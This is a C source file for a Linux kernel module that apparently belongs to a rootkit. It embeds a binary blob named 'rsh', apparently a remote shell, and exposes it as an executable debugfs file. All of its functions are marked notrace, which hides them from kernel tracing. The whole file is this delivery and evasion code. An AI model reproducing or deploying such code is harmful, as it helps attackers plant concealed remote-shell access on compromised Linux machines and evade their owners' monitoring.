#include <linux/module.h>
#include <linux/debugfs.h>
#include <linux/seq_file.h>

#include "config.h"
#include "debugfs.h"
#include "htm.h"

#define HTM_SIZE_RSH ((size_t)(_rsh_end - _rsh_start))

extern unsigned char _rsh_start[];
extern unsigned char _rsh_end[];

static struct dentry *_directory = NULL;
static struct dentry *_file = NULL;

static notrace int _show(struct seq_file *m, void *v)
{
	seq_write(m, _rsh_start, (_rsh_end - _rsh_start));
	return 0;
}

static notrace int _open(struct inode *inode, struct file *file)
{
	return single_open(file, _show, inode->i_private);
}

static const struct file_operations _fops = {
	.owner   = THIS_MODULE,
	.open    = _open,
	.read    = seq_read,
	.llseek  = seq_lseek,
	.release = single_release,
};

notrace int htm_debugfs_rsh_create(void)
{
	if (_directory && _file) {
		#ifdef HTM_DEBUG
		htm_pr_warn("debugfs file is already exposed");
		#endif

		return -EINVAL;
	}
	else
	if (_directory) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory already exists");
		#endif

		return -EINVAL;
	}
	else
	if (_file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file already exists");
		#endif

		return -EINVAL;
	}

	if (! (_directory = debugfs_create_dir(HTM_DEBUGFS_DIR, NULL))) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to initialize debugfs directory for module");
		#endif

		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory created: %s", HTM_DEBUGFS_DIR);
	#endif

	if (! (_file = debugfs_create_file(HTM_DEBUGFS_FILE, 0500, _directory, NULL, &_fops))) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to create debugfs file - removing directory");
		#endif

		debugfs_remove(_directory);
		return -ENOMEM;
	}

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs file created: %s", HTM_DEBUGFS_FILE);
	#endif

	return 0;
}

notrace int htm_debugfs_rsh_remove(void)
{
	if (! _file && ! _directory) {
		#ifdef HTM_DEBUG
		htm_pr_warn("debugfs file is not exposed");
		#endif

		return -EINVAL;
	}
	else
	if (! _file) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs file does not exist");
		#endif

		return -EINVAL;
	}
	else
	if (! _directory) {
		#ifdef HTM_DEBUG
		htm_pr_err("debugfs directory does not exist");
		#endif

		return -EINVAL;
	}

	debugfs_remove_recursive(_directory);

	#ifdef HTM_DEBUG
	htm_pr_notice("debugfs directory removed");
	#endif

	_file = NULL;
	_directory = NULL;

	return 0;
}
